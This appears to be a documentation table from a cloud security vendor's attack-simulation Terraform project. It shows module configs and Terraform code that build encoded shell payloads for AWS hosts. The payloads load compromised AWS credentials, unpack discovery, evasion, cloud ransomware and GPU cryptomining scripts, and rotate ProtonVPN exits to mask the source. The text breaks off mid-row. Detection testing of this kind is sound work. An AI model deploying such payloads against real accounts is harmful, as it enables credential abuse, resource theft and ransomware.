| target-ssm-execute-generate-aws-cli-traffic                                | ./modules/ssm/execute-generate-aws-cli-traffic                 | ssm_exec_generate_aws_cli_traffic_target   | context.aws.ssm.target.execute.generate_aws_cli_traffic                   | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_aws_cli_traffic": {<br/>                            "commands": [<br/>                                "x=10",<br/>                                "opts=\"--output json --color off --no-cli-pager\"",<br/>                                "while [ $x -gt 0 ]; do ",<br/>                                "log \"Running: aws sts get-caller-identity $opts\"",<br/>                                "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws iam list-users $opts\"",<br/>                                "aws iam list-users $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws s3api list-buckets $opts\"",<br/>                                "aws s3api list-buckets $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-instances $opts\"",<br/>                                "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",<br/>                                "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-volumes $opts\"",<br/>                                "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-vpcs $opts\"",<br/>                                "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",<br/>                                "x=$(($x-1))",<br/>                                "done"<br/>                            ],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "aws-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-aws-cli-traffic                 | <pre>locals \{<br/>    tool = "aws"<br/>    attack\_dir = "/generate\-aws\-cli\-traffic"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "echo '$\{k\.rendered\}' > $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}" \]\)<br/>    aws\_commands = join\("\\n", \[ for command in var\.inputs\["commands"\]: "$\{command\}" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    source \.env\-aws\-$\{var\.inputs\["compromised\_keys\_user"\]\}<br/>    PROFILE="$\{var\.inputs\["profile"\]\}"<br/>    REGION="$\{var\.inputs\["region"\]\}"<br/>    aws configure set aws\_access\_key\_id $AWS\_ACCESS\_KEY\_ID \-\-profile=$PROFILE<br/>    aws configure set aws\_secret\_access\_key $AWS\_SECRET\_ACCESS\_KEY \-\-profile=$PROFILE<br/>    aws configure set region $REGION \-\-profile=$PROFILE<br/>    aws configure set output json \-\-profile=$PROFILE<br/>    log "Running aws commands\.\.\."<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        $\{local\.aws\_commands\}<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        while \! command \-v $\{local\.tool\} > /dev/null; do<br/>            log "$\{local\.tool\} not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        while \! command \-v $\{local\.tool\} > /dev/null; do<br/>            log "$\{local\.tool\} not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| target-ssm-execute-generate-web-traffic-target                             | ./modules/ssm/execute-generate-web-traffic                     | ssm_exec_generate_web_traffic_target       | context.aws.ssm.target.execute.generate_web_traffic                       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic                     | <pre>locals \{<br/>    attack\_dir = "/generate\-web\-traffic"<br/>    curl\_urls = join\("\\n", \[ for url in var\.inputs\["urls"\]: "curl \-s \-\-retry 20 \-\-retry\-connrefused \-\-retry\-delay 60 \-\-connect\-timeout 5 '$\{url\}'; log \\"curl $\{url\} result: $?\\"" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    log "Enumerating urls\.\.\."<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "Running url enumeration:\\n$\{local\.curl\_urls\}"<br/>        $\{local\.curl\_urls\}<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| attacker-simulation-attacker-exec-docker-composite-cloud-cryptomining      | ./modules/ssm/execute-docker-composite-cloud-cryptomining      | ssm_exec_docker_cloud_cryptomining         | context.aws.ssm.attacker.execute.docker_composite_cloud_cryptomining      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_cloud_cryptomining": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-cloud-cryptomining      | <pre>locals \{<br/>    attack\_dir = "/cloud\-tunnel"<br/>    script = "cloudcrypto"<br/>    script\_type = "terraform"<br/>    attack\_type = "cloud\_cryptomining"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "echo '$\{k\.rendered\}' > $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo '$\{base64gzip\(local\.start\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/start\.sh<br/>    echo '$\{base64gzip\(local\.auto\-free\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo '$\{base64gzip\(local\.auto\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo '$\{base64gzip\(local\.protonvpn\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo '$\{base64gzip\(local\.protonvpn\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo '$\{base64gzip\(local\.protonvpn\-baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo '$\{base64gzip\(local\.baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo '$\{base64gzip\(local\.discovery\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo '$\{base64gzip\(local\.evasion\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo '$\{base64gzip\(local\.cloudransom\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo '$\{base64gzip\(local\.cloudcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo '$\{base64gzip\(local\.hostcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log "Starting as background job\.\.\."<br/>    if \[ "$\{var\.inputs\["protonvpn\_tier"\]\}" == "0" \]; then<br/>        for i in $\(echo "US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55"\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo "AU CR IS JP LV NL NZ SG SK US"\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log "Done\."<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-paid       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = 2<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    protonvpn\-baseline  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = "US"<br/>                                    protonvpn\_tier = tostring\(var\.inputs\["protonvpn\_tier"\]\)<br/>                                    protonvpn\_protocol = var\.inputs\["protonvpn\_protocol"\]<br/>                                    protonvpn\_privatekey = try\(length\(var\.inputs\["protonvpn\_privatekey"\]\), "false"\) \!= "false" ? var\.inputs\["protonvpn\_privatekey"\] : ""<br/>                                \}<br/>                            \)<br/>    auto\-free   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-free\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    auto\-paid   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/auto\-paid\.sh\.tpl",<br/>                                \{<br/>                                    compromised\_keys\_user = var\.inputs\["compromised\_keys\_user"\]<br/>                                    script = local\.script<br/>                                    script\_type = local\.script\_type<br/>                                    attack\_type = local\.attack\_type<br/>                                    attack\_delay = var\.inputs\["attack\_delay"\]<br/>                                \}<br/>                            \)<br/>    baseline    = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/baseline\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    discovery   = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/discovery\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    evasion     = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/evasion\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudransom = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudransom\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/>    cloudcrypto = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "crypto\-gpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    instances = 12<br/>                                    wallet = var\.inputs\["ethermine\_wallet"\]<br/>                                    region = var\.inputs\["region"\]<br/>                                \}<br/>                            \)<br/>    hostcrypto  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto\.tf\.tpl",<br/>                                \{<br/>                                    name = "host\-cpu\-miner\-$\{var\.inputs\["environment"\]\}\-$\{var\.inputs\["deployment"\]\}"<br/>                                    region = var\.inputs\["region"\]<br/>                                    instances = 1<br/>                                    minergate\_user = var\.inputs\["minergate\_user"\]<br/>                                    nicehash\_user = var\.inputs\["nicehash\_user"\]<br/>                                \}<br/>                            \)<br/>    <br/>    terraform  = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/terraform\.sh\.tpl",<br/>                                \{<br/>                                \}<br/>                            \)<br/>    <br/>    start       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/start\.sh\.tpl",<br/>                                \{<br/>                                    attack\_type = local\.attack\_type<br/>                                \}<br/>                            \)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-free\.sh"<br/>                content = base64encode\(local\.auto\-free\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_auto\-paid\.sh"<br/>                content = base64encode\(local\.auto\-paid\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_baseline\.sh"<br/>                content = base64encode\(local\.baseline\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_discovery\.sh"<br/>                content = base64encode\(local\.discovery\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_evasion\.sh"<br/>                content = base64encode\(local\.evasion\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_cloudransom\.sh"<br/>                content = base64encode\(local\.cloudransom\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_terraform\.sh"<br/>                content = base64encode\(local\.terraform\)<br/>            \},<br/>            \{<br/>                name = "$\{basename\(abspath\(path\.module\)\)\}\_start\.sh"<br/>                content = base64encode\(local\.start\)<br/>            \}<br/>        \]<br/>    \}<br/><br/><br/>\}</pre> |
| attacker-simulation-attacker-exec-docker-composite-cloud-ransomware        | ./modules/ssm/execute-docker-composite-cloud-ransomware        | ssm_exec_docker_cloud_ransomware           | context.aws.ssm.attacker.execute.docker_composite_cloud_ransomware        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_cloud_ransomware": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-cloud-ransomware        | <pre>locals \{<br/>    attack\_dir = "/cloud\-tunnel"<br/>    script = "cloudransom\.sh"<br/>    script\_type = "aws\-cli"<br/>    attack\_type = "cloud\_ransomware"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "echo '$\{k\.rendered\}' > $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}" \]\)<br/>    payload = <<\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo '$\{base64gzip\(local\.start\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/start\.sh<br/>    echo '$\{base64gzip\(local\.auto\-free\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo '$\{base64gzip\(local\.auto\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo '$\{base64gzip\(local\.protonvpn\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo '$\{base64gzip\(local\.protonvpn\-paid\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo '$\{base64gzip\(local\.protonvpn\-baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo '$\{base64gzip\(local\.baseline\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo '$\{base64gzip\(local\.discovery\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo '$\{base64gzip\(local\.evasion\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/evasion\.sh<br/>    echo '$\{base64gzip\(local\.cloudransom\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/aws\-cli/scripts/cloudransom\.sh<br/>    echo '$\{base64gzip\(local\.cloudcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/cloudcrypto/terraform\.sh<br/>    echo '$\{base64gzip\(local\.hostcrypto\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/main\.tf<br/>    echo '$\{base64gzip\(local\.terraform\)\}' \| base64 \-d \| gunzip > /$\{local\.attack\_dir\}/terraform/scripts/hostcrypto/terraform\.sh<br/>    log "Starting as background job\.\.\."<br/>    if \[ "$\{var\.inputs\["protonvpn\_tier"\]\}" == "0" \]; then<br/>        for i in $\(echo "US NL\-FREE\#1 JP\-FREE\#3 NL\-FREE\#4 NL\-FREE\#8 US\-FREE\#5 NL\-FREE\#9 NL\-FREE\#12 NL\-FREE\#13 NL\-FREE\#14 NL\-FREE\#15 NL\-FREE\#16 US\-FREE\#13 US\-FREE\#32 US\-FREE\#33 US\-FREE\#34 NL\-FREE\#39 NL\-FREE\#52 NL\-FREE\#57 NL\-FREE\#87 NL\-FREE\#133 NL\-FREE\#136 NL\-FREE\#148 US\-FREE\#52 US\-FREE\#53 US\-FREE\#54 US\-FREE\#51 NL\-FREE\#163 NL\-FREE\#164 US\-FREE\#58 US\-FREE\#57 US\-FREE\#56 US\-FREE\#55"\); do cp \.env\-protonvpn \.env\-protonvpn\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-$i; done<br/>        /bin/bash auto\-free\.sh<br/>    else<br/>        for i in $\(echo "AU CR IS JP LV NL NZ SG SK US"\); do cp \.env\-protonvpn\-paid \.env\-protonvpn\-paid\-$i; sed \-i "s/RANDOM/$i/" \.env\-protonvpn\-paid\-$i; done<br/>        /bin/bash auto\-paid\.sh<br/>    fi;<br/>    log "Done\."<br/>    EOT<br/><br/>    protonvpn       = templatefile\(<br/>                                "$\{abspath\(path\.root\)\}/modules/deployment/common/payloads/linux/modules/resources/protonvpn\.env\.tpl", <br/>                                \{<br/>                                    protonvpn\_user = var\.inputs\["protonvpn\_user"\]<br/>                                    protonvpn\_password = var\.inputs\["protonvpn\_password"\]<br/>                                    protonvpn\_server = var\.inputs\["protonvpn\_server"\]<br/>                                    protonvpn\_tier = 